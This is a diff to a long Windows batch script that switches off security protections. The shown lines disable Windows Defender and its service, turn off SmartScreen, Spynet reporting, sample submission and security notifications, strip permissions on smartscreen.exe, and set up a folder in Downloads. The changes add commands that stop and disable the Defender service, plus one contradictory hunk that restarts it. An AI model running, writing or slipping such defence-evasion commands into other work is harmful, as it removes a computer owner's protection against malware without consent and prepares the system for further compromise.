@@ -8607,6 +8607,8 @@ Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHea
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /f
 icacls "%systemroot%\System32\smartscreen.exe" /reset
 Reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /f
+sc start WinDefend
+sc config WinDefend start= auto
 cd C:\Users\%username%\Downloads
 mkdir bin
 cd C:\Users\%username%\Downloads\bin
@@ -8648,7 +8650,7 @@ SCHTASKS /CHANGE /DISABLE /TN "\Microsoft\Windows\Windows Defender\Windows Defen
 REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /V SpyNetReporting /T REG_DWORD /D 0 /F
 REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /V SubmitSamplesConsent /T REG_DWORD /D 2 /F
 reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /V SmartScreenEnabled /T REG_SZ "OFF" /F
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /V SmartScreenEnabled /T REG_SZ /D "OFF" /F
 Reg.exe add "HKLM\SOFTWARE\Policies\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d "1" /f
 Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "AllowFastServiceStartup" /t REG_DWORD /d "0" /f
 Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
@@ -8701,6 +8703,8 @@ icacls "%systemroot%\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-
 Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 Reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /f
 Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f
+sc stop WinDefend
+sc config WinDefend start= disabled
 cd C:\Users\%username%\Downloads
 mkdir bin
 cd C:\Users\%username%\Downloads\bin
